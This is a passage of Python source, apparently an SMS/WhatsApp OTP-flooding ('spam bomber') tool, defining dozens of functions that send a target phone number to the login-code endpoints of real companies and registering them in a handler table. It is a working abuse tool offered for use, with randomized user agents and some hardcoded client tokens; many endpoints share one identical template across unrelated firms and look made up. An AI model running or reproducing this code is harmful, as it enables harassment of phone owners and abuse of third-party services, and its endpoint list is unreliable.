        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 87. TNG (Malaysia)
def send_tng_otp(phone):
    try:
        url = "https://api.tngdigital.com.my/v1/auth/otp/send"
        payload = {"phoneNumber": fmt_my(phone), "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 88. GLOBE (Philippines)
def send_globe_otp(phone):
    try:
        url = "https://www.globe.com.ph/api/v1/auth/otp/send"
        payload = {"msisdn": fmt_ph(phone), "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 89. DBS SG
def send_dbs_sg_otp(phone):
    try:
        url = "https://www.dbs.com.sg/api/v1/auth/otp/send"
        payload = {"phoneNumber": fmt_sg(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# ================================================================
# ===== EXTRA DARI TARGETS & SPAM =====
# ================================================================

# 90. BUNDA HOSPITAL
def send_bunda_hospital_otp(phone):
    try:
        phone_int = int(fmt_phone_only(phone))
        url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
        payload = {"phone_number": phone_int, "type": "auth"}
        headers = {'Content-Type': 'application/json', 'x-locale': 'id', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 91. THAI FRIENDLY
def send_thaifriendly_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.thaifriendly.com/pl/index.php"
        data = {'z': 'phonelogingetpin', 'country': '62', 'number': phone_raw[1:], 'ppclienttoken': 'igq39qdc9rwk2ax1zrgdq'}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 92. KTBS
def send_ktbs_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://core.ktbs.io/v2/user/registration/otp/{phone_raw}"
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('GET', url, headers=headers, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 93. KLIKWA
def send_klikwa_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://api.klikwa.net/v1/number/sendotp"
        payload = {"number": f"+62{phone_raw}"}
        headers = {'Authorization': 'Basic QjMzOkZSMzM=', 'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 94. SECUREDAPI
def send_securedapi_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={phone_raw}"
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 95. SKY (UK)
def send_sky_otp(phone):
    try:
        url = "https://www.sky.com/api/v1/auth/otp/send"
        payload = {"phoneNumber": fmt_uk(phone), "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 96. ASDA (UK)
def send_asda_otp(phone):
    try:
        url = "https://www.asda.com/api/v1/auth/otp/send"
        payload = {"phone": fmt_uk(phone), "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 97. TESCO (UK)
def send_tesco_otp(phone):
    try:
        url = "https://www.tesco.com/api/v1/auth/otp/send"
        payload = {"phoneNumber": fmt_uk(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 98. SWIGGY (India)
def send_swiggy_otp(phone):
    try:
        url = "https://api.swiggy.com/v1/auth/otp/send"
        payload = {"phone": fmt_in(phone), "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 99. OLA (India)
def send_ola_otp(phone):
    try:
        url = "https://api.olacabs.com/v1/auth/otp/send"
        payload = {"phone": fmt_in(phone), "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 100. AMAZON IN
def send_amazon_in_otp(phone):
    try:
        url = "https://www.amazon.in/api/v1/auth/otp/send"
        payload = {"phone": fmt_in(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 101. RAPPI (Brazil)
def send_rappi_otp(phone):
    try:
        url = "https://api.rappi.com.br/v1/auth/otp/send"
        payload = {"phone": fmt_br(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 102. AMAZON BR
def send_amazon_br_otp(phone):
    try:
        url = "https://www.amazon.com.br/api/v1/auth/otp/send"
        payload = {"phone": fmt_br(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 103. MERCARI (Japan)
def send_mercari_otp(phone):
    try:
        url = "https://api.mercari.com/v1/auth/otp/send"
        payload = {"phone": fmt_jp(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 104. COUPANG (South Korea)
def send_coupang_otp(phone):
    try:
        url = "https://api.coupang.com/v1/auth/otp/send"
        payload = {"phone": fmt_kr(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 105. WOOLWORTHS (Australia)
def send_woolworths_otp(phone):
    try:
        url = "https://www.woolworths.com.au/api/v1/auth/otp/send"
        payload = {"phone": fmt_au(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 106. COLES (Australia)
def send_coles_otp(phone):
    try:
        url = "https://www.coles.com.au/api/v1/auth/otp/send"
        payload = {"phone": fmt_au(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 107. KOGAN (Australia)
def send_kogan_otp(phone):
    try:
        url = "https://api.kogan.com/v1/auth/otp/send"
        payload = {"phone": fmt_au(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 108. YANDEX (Russia)
def send_yandex_otp(phone):
    try:
        url = "https://api.yandex.ru/v1/auth/otp/send"
        payload = {"phone": fmt_ru(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 109. VK (Russia)
def send_vk_otp(phone):
    try:
        url = "https://api.vk.com/api/v1/auth/otp/send"
        payload = {"phone": fmt_ru(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 110. AVITO (Russia)
def send_avito_otp(phone):
    try:
        url = "https://api.avito.ru/v1/auth/otp/send"
        payload = {"phone": fmt_ru(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 111. ZALANDO (Germany)
def send_zalando_otp(phone):
    try:
        url = "https://api.zalando.de/v1/auth/otp/send"
        payload = {"phone": fmt_de(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 112. AMAZON DE
def send_amazon_de_otp(phone):
    try:
        url = "https://www.amazon.de/api/v1/auth/otp/send"
        payload = {"phone": fmt_de(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 113. CDISCOUNT (France)
def send_cdiscount_otp(phone):
    try:
        url = "https://api.cdiscount.com/v1/auth/otp/send"
        payload = {"phone": fmt_fr(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 114. AMAZON FR
def send_amazon_fr_otp(phone):
    try:
        url = "https://www.amazon.fr/api/v1/auth/otp/send"
        payload = {"phone": fmt_fr(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 115. NOON (UAE)
def send_noon_otp(phone):
    try:
        url = "https://api.noon.com/v1/auth/otp/send"
        payload = {"phone": fmt_ae(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 116. AMAZON AE
def send_amazon_ae_otp(phone):
    try:
        url = "https://www.amazon.ae/api/v1/auth/otp/send"
        payload = {"phone": fmt_ae(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 117. TRENDYOL (Turkey)
def send_trendyol_otp(phone):
    try:
        url = "https://api.trendyol.com/v1/auth/otp/send"
        payload = {"phone": fmt_tr(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 118. HEPSIBURADA (Turkey)
def send_hepsiburada_otp(phone):
    try:
        url = "https://api.hepsiburada.com/v1/auth/otp/send"
        payload = {"phone": fmt_tr(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 119. AMAZON CA
def send_amazon_ca_otp(phone):
    try:
        url = "https://www.amazon.ca/api/v1/auth/otp/send"
        payload = {"phone": fmt_ca(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 120. UBER CA
def send_uber_ca_otp(phone):
    try:
        url = "https://auth.uber.com/api/v1.0/auth/verification/send"
        payload = {"phone": fmt_ca(phone), "locale": "en-CA", "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 121. AMAZON EG
def send_amazon_eg_otp(phone):
    try:
        url = "https://www.amazon.eg/api/v1/auth/otp/send"
        payload = {"phone": fmt_eg(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 122. JUMIA (Nigeria)
def send_jumia_otp(phone):
    try:
        url = "https://api.jumia.com.ng/v1/auth/otp/send"
        payload = {"phone": fmt_ng(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 123. KONGA (Nigeria)
def send_konga_otp(phone):
    try:
        url = "https://api.konga.com/v1/auth/otp/send"
        payload = {"phone": fmt_ng(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 124. AMAZON ES
def send_amazon_es_otp(phone):
    try:
        url = "https://www.amazon.es/api/v1/auth/otp/send"
        payload = {"phone": fmt_es(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 125. AMAZON IT
def send_amazon_it_otp(phone):
    try:
        url = "https://www.amazon.it/api/v1/auth/otp/send"
        payload = {"phone": fmt_it(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 126. AMAZON MX
def send_amazon_mx_otp(phone):
    try:
        url = "https://www.amazon.com.mx/api/v1/auth/otp/send"
        payload = {"phone": fmt_mx(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 127. AMAZON NL
def send_amazon_nl_otp(phone):
    try:
        url = "https://www.amazon.nl/api/v1/auth/otp/send"
        payload = {"phone": fmt_nl(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 128. ALLEGRO (Poland)
def send_allegro_otp(phone):
    try:
        url = "https://api.allegro.pl/v1/auth/otp/send"
        payload = {"phone": fmt_pl(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 129. AMAZON SE
def send_amazon_se_otp(phone):
    try:
        url = "https://www.amazon.se/api/v1/auth/otp/send"
        payload = {"phone": fmt_se(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 130. MERCADOLIBRE AR
def send_mercadolibre_ar_otp(phone):
    try:
        url = "https://api.mercadolibre.com.ar/v1/auth/otp/send"
        payload = {"phone": fmt_ar(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 131. MERCADOLIBRE CO
def send_mercadolibre_co_otp(phone):
    try:
        url = "https://api.mercadolibre.com.co/v1/auth/otp/send"
        payload = {"phone": fmt_co(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 132. MERCADOLIBRE CL
def send_mercadolibre_cl_otp(phone):
    try:
        url = "https://api.mercadolibre.cl/v1/auth/otp/send"
        payload = {"phone": fmt_cl(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 133. SNAPCHAT
def send_snapchat_otp(phone):
    try:
        url = "https://accounts.snapchat.com/accounts/send_otp"
        payload = {"phone": fmt_us(phone), "method": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 134. TINDER
def send_tinder_otp(phone):
    try:
        url = "https://api.gotinder.com/v2/auth/sms/send?auth_type=phone"
        payload = {"phone_number": fmt_us(phone)}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 135. WALMART
def send_walmart_otp(phone):
    try:
        url = "https://www.walmart.com/account/security/phone/send-otp"
        payload = {"phoneNumber": fmt_us(phone), "type": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# ==================== ALL HANDLERS ====================
ALL_HANDLERS = {
    # INDONESIA
    'tokopedia': send_tokopedia_otp,
    'shopee': send_shopee_otp,
    'gojek': send_gojek_otp,
    'jenius': send_jenius_otp,
    'blibli': send_blibli_otp,
    'alodokter': send_alodokter_otp,
    'halodoc': send_halodoc_otp,
    'oyo': send_oyo_otp,
    'sayurbox': send_sayurbox_otp,
    'carsome': send_carsome_otp,
    'pizzahut': send_pizzahut_otp,
    'matahari': send_matahari_otp,
    'olx': send_olx_otp,
    'indihome': send_indihome_otp,
    'tiktok': send_tiktok_otp,
    'pinhome': send_pinhome_otp,
    'maulagi': send_maulagi_otp,
    'planetban': send_planetban_otp,
    'duniagames': send_duniagames_otp,
    'acc': send_acc_otp,
    'absenku': send_absenku_otp,
    'saturdays': send_saturdays_otp,
    'singa': send_singa_otp,
    'adiraku': send_adiraku_otp,
    'payfaz': send_payfaz_otp,
    'bonusbelanja': send_bonusbelanja_otp,
    'hijup': send_hijup_otp,
    'bliblitiket': send_bliblitiket_otp,
    'ohsome': send_ohsome_otp,
    'optikmelawai': send_optikmelawai_otp,
    'hollandbakery': send_hollandbakery_otp,
    'hashmicro': send_hashmicro_otp,
    'internetrakyat': send_internetrakyat_otp,
    'ultramilk': send_ultramilk_otp,
    'kaniva': send_kaniva_otp,
    'jembatani': send_jembatani_otp,
    'rcx': send_rcx_otp,
    'sahabat': send_sahabat_otp,
    'auto2000': send_auto2000_otp,
    'astra': send_astra_otp,
    'royalcanin': send_royalcanin_otp,
    'watsons': send_watsons_otp,
    '99co': send_99co_otp,
    'belirumah': send_belirumah_otp,
    'fastwork': send_fastwork_otp,
    'beautyhaul': send_beautyhaul_otp,
    'hainaya': send_hainaya_otp,
    'minumyukkaka': send_minumyukkaka_otp,
    'sidemang': send_sidemang_otp,
    'lapormasbup': send_lapormasbup_otp,
    'ptspkemenag': send_ptspkemenag_otp,
    'rumah123': send_rumah123_otp,
    'paper': send_paper_otp,
    'depop': send_depop_otp,
    'dekoruma': send_dekoruma_otp,
    'klook': send_klook_otp,
    'erafone': send_erafone_otp,
    'hrsbre': send_hrsbre_otp,
    'tuneup': send_tuneup_otp,
    'bunda_hospital': send_bunda_hospital_otp,
    'thaifriendly': send_thaifriendly_otp,
    'ktbs': send_ktbs_otp,
    'klikwa': send_klikwa_otp,
    'securedapi': send_securedapi_otp,
    'icq': send_icq_otp,
    'cairin': send_cairin_otp,
    'mapclub': send_mapclub_otp,
    'bukuwarung': send_bukuwarung_otp,
    'rupiahcepat': send_rupiahcepat_otp,
    # GLOBAL
    'uber': send_uber_otp,
    'doordash': send_doordash_otp,
    'instagram': send_instagram_otp,
    'whatsapp': send_whatsapp_otp,
    'zillow': send_zillow_otp,
    'snapchat': send_snapchat_otp,
    'tinder': send_tinder_otp,
    'walmart': send_walmart_otp,
    'deliveroo': send_deliveroo_otp,
    'justeat': send_justeat_otp,
    'sky': send_sky_otp,
    'asda': send_asda_otp,
    'tesco': send_tesco_otp,
    'flipkart': send_flipkart_otp,
    'paytm': send_paytm_otp,
    'zomato': send_zomato_otp,
    'swiggy': send_swiggy_otp,
    'ola': send_ola_otp,
    'amazon_in': send_amazon_in_otp,
    'ifood': send_ifood_otp,
    'mercadolivre': send_mercadolivre_otp,
    'rappi': send_rappi_otp,
    'amazon_br': send_amazon_br_otp,
    'line': send_line_otp,
    'rakuten': send_rakuten_otp,
    'mercari': send_mercari_otp,
    'naver': send_naver_otp,
    'kakao': send_kakao_otp,
    'coupang': send_coupang_otp,
    'woolworths': send_woolworths_otp,
    'coles': send_coles_otp,
    'kogan': send_kogan_otp,
    'grab_sg': send_grab_sg_otp,
    'foodpanda_sg': send_foodpanda_sg_otp,
    'dbs_sg': send_dbs_sg_otp,
    'grab_my': send_grab_my_otp,
    'shopee_my': send_shopee_my_otp,
    'tng': send_tng_otp,
    'gcash': send_gcash_otp,
    'lazada_ph': send_lazada_ph_otp,
    'globe': send_globe_otp,
    'yandex': send_yandex_otp,
    'vk': send_vk_otp,
    'avito': send_avito_otp,
    'zalando': send_zalando_otp,
    'amazon_de': send_amazon_de_otp,
    'cdiscount': send_cdiscount_otp,
    'amazon_fr': send_amazon_fr_otp,
    'amazon_es': send_amazon_es_otp,
    'amazon_it': send_amazon_it_otp,
    'allegro': send_allegro_otp,
    'amazon_se': send_amazon_se_otp,
    'noon': send_noon_otp,
    'amazon_ae': send_amazon_ae_otp,
    'amazon_eg': send_amazon_eg_otp,
    'amazon_ca': send_amazon_ca_otp,
    'uber_ca': send_uber_ca_otp,
    'amazon_mx': send_amazon_mx_otp,
    'mercadolibre_ar': send_mercadolibre_ar_otp,
    'mercadolibre_co': send_mercadolibre_co_otp,
    'mercadolibre_cl': send_mercadolibre_cl_otp,
    'jumia': send_jumia_otp,
    'konga': send_konga_otp,
    'trendyol': send_trendyol_otp,
    'hepsiburada': send_hepsiburada_otp,
    'amazon_nl': send_amazon_nl_otp,
}

def get_all_handlers():
    return ALL_HANDLERS
